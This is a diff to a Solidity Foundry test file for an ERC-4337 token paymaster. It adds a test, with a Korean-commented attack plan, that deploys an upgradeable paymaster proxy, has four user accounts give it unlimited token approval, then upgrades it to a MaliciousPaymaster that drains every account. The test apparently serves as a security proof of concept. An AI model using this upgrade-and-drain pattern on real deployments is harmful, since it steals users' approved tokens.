@@ -14,6 +14,8 @@ import {OracleHelperConfig, TokenPaymasterConfig, UniswapHelperConfig} from "../
 import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
 import "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
 import "account-abstraction-v7/core/UserOperationLib.sol";
+import "../../utils/PaymasterProxy.sol";
+import "../../utils/MaliciousPaymaster.sol";
 
 contract TestTokenPaymasterV07 is Test {
     TokenPaymaster paymaster;
@@ -26,6 +28,7 @@ contract TestTokenPaymasterV07 is Test {
     TestOracle2 tokenOracle;
     TestOracle2 nativeOracle;
     PaymasterFactoryV07 paymasterFactory;
+    PaymasterProxy paymasterProxy;
 
     address payable beneficiary;
     address payable bundler;
@@ -218,6 +221,12 @@ contract TestTokenPaymasterV07 is Test {
         assertEq(useGas1, useGas2);
     }
 
+    /**
+    이거 하나 dummy로 보내고
+    일단 userOp보내고 gas소모 확인
+    paymaster가 update
+    같은거 또 보내기    
+     */
     function testIfMaliciousPaymasterCanDrainUser() external {
         vm.deal(paymasterOwner, 10e18);
         vm.startPrank(paymasterOwner);
@@ -367,6 +376,117 @@ contract TestTokenPaymasterV07 is Test {
 
         vm.startPrank(bundler);
         entryPoint.handleOps(ops, beneficiary);
+    }
+
+    // 악의적인 페이마스터 공격 로직
+    /**
+        1. 업그레이드 가능한 페이마스터 생성
+        2. 유저들이 페이마스터를 사용하게 되고 악의적인 페이마스터는 계속해서 정상적으로 작동
+        3. 유저가 충분히 모이고 approve된 금액이 일정 수준 이상이 되었다 싶으면 악의적인 페이마스터로 업그레이드
+        4. transferFrom 같은 함수를 심어 유저의 모든 토큰을 빼낸다.    
+    */
+    function testIfPaymasterIsUpgradealble() external {
+        address user1 = makeAddr("user1");
+        address user2 = makeAddr("user2");
+        address user3 = makeAddr("user3");
+        address user4 = makeAddr("user4");
+        SimpleAccount userAccount1 = accountfactory.createAccount(user1, 0);
+        SimpleAccount userAccount2 = accountfactory.createAccount(user2, 0);
+        SimpleAccount userAccount3 = accountfactory.createAccount(user3, 0);
+        SimpleAccount userAccount4 = accountfactory.createAccount(user4, 0);
+
+        token.sudoMint(address(userAccount1), 1e18);
+        token.sudoMint(address(userAccount2), 1e18);
+        token.sudoMint(address(userAccount3), 1e18);
+        token.sudoMint(address(userAccount4), 1e18);
+
+        vm.deal(paymasterOwner, 10e18);
+        vm.startPrank(paymasterOwner);
+        console.log("deploy paymasterProxy");
+        paymasterProxy = new PaymasterProxy(
+            address(paymaster),
+            paymasterOwner,
+            ""
+        );
+
+        console.log("deploy paymasterProxy done");
+
+        entryPoint.depositTo{value: 10e18}(address(paymasterProxy));
+        vm.stopPrank();
+
+        token.sudoApprove(
+            address(userAccount1),
+            address(paymasterProxy),
+            type(uint256).max
+        );
+        token.sudoApprove(
+            address(userAccount2),
+            address(paymasterProxy),
+            type(uint256).max
+        );
+        token.sudoApprove(
+            address(userAccount3),
+            address(paymasterProxy),
+            type(uint256).max
+        );
+        token.sudoApprove(
+            address(userAccount4),
+            address(paymasterProxy),
+            type(uint256).max
+        );
+
+        vm.startPrank(paymasterOwner);
+        console.log(address(paymasterOwner));
+        address newPaymaster = address(new MaliciousPaymaster());
+
+        address[] memory targets = new address[](4);
+        targets[0] = address(userAccount1);
+        targets[1] = address(userAccount2);
+        targets[2] = address(userAccount3);
+        targets[3] = address(userAccount4);
+
+        bytes memory data = abi.encodeWithSelector(
+            MaliciousPaymaster.attack.selector,
+            targets, // 배열을 직접 전달
+            address(token),
+            address(paymasterOwner)
+        );
+
+        // low-level call
+        console.log("call upgradeToAndCall");
+        address(paymasterProxy).call(
+            abi.encodeWithSignature(
+                "upgradeToAndCall(address,bytes)",
+                newPaymaster,
+                data
+            )
+        );
+
+        vm.stopPrank();
+
+        assertEq(
+            token.balanceOf(address(userAccount1)),
+            0,
+            "user1's balance must be 0"
+        );
+
+        assertEq(
+            token.balanceOf(address(userAccount2)),
+            0,
+            "user2's balance must be 0"
+        );
+
+        assertEq(
+            token.balanceOf(address(userAccount3)),
+            0,
+            "user3's balance must be 0"
+        );
+
+        assertEq(
+            token.balanceOf(address(userAccount4)),
+            0,
+            "user4's balance must be 0"
+        );
     }
 
     function signUserOp(
